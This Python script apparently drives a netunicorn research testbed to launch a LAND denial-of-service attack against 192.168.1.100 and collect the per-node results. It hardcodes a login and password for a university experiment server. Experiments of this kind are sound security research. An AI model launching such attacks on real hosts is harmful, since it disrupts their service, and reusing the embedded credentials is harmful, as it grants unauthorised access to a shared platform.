from netunicorn.client.remote import RemoteClient, RemoteClientException
from netunicorn.base.pipeline import Pipeline
from netunicorn.library.tasks.network_attacks.land import LANDAttack
from netunicorn.base.experiment import Experiment, ExperimentStatus
from netunicorn.base.environment_definitions import ShellExecution
from netunicorn.base.nodes import NodePool
import time

# Credentials
endpoint = "https://pinot.cs.ucsb.edu/netunicorn"
login = "293nmay25"
password = "4Ij9Du65jrqj"

# Client Initialization
client = RemoteClient(endpoint=endpoint, login=login, password=password)

# Pipeline Creation
pipeline = Pipeline()
land_task = LANDAttack(target_ip="192.168.1.100", source_port=1337, destination_port=80)
pipeline.then(land_task)

# Node Selection
node_pool = client.get_nodes()
working_nodes = node_pool.take(1)

# Experiment Object and Definition
experiment = Experiment()
experiment.environment_definition = ShellExecution()
experiment.map(pipeline, working_nodes)

# Experiment Naming and Cleanup
experiment_name = "land_attack_experiment_{timestamp}"
try:
    client.delete_experiment(experiment_name)
    print(f"Successfully deleted pre-existing experiment: {experiment_name}")
except RemoteClientException as e:
    print(f"Info: Could not delete experiment {experiment_name} (may not exist or already deleted): {e}")
except Exception as e:
    print(f"Warning: An unexpected error occurred while trying to delete experiment {experiment_name}: {e}")

# Prepare Experiment
client.prepare_experiment(experiment, experiment_name)

# Poll for READY
print(f"Experiment {experiment_name} prepared. Waiting for readiness...")
while True:
    status = client.get_experiment_status(experiment_name).status
    print(f"Current status: {status}")
    if status == ExperimentStatus.READY:
        print("Experiment is READY.")
        break
    elif status == ExperimentStatus.FINISHED or status == ExperimentStatus.ERROR:
        print(f"Experiment entered {status} state before becoming READY. Aborting.")
        exit()
    time.sleep(10)

# Start Experiment
client.start_execution(experiment_name)

# Wait for Experiment to Complete
print(f"Experiment {experiment_name} started. Waiting for completion...")
while True:
    status = client.get_experiment_status(experiment_name).status
    print(f"Current status: {status}")
    if status == ExperimentStatus.FINISHED:
        print("Experiment FINISHED.")
        break
    elif status == ExperimentStatus.ERROR:
        print(f"Experiment entered ERROR state. Aborting wait. Check logs.")
        break
    time.sleep(20)

# Retrieve and Print Results
final_status_info = client.get_experiment_status(experiment_name)
if final_status_info.status == ExperimentStatus.FINISHED:
    results = final_status_info.execution_result
    print(f"Experiment results: {results}")
    if results:
        for report_list in results:
            for report in report_list:
                if report:
                    print(f"Node: {report.node.name}, Success: {report.success}, Log: {report.log}")
                    if not report.success:
                        print(f"Error details: {report.error}")
else:
    print(f"Experiment did not finish successfully. Final status: {final_status_info.status}")
    if final_status_info.error:
        print(f"Error: {final_status_info.error}")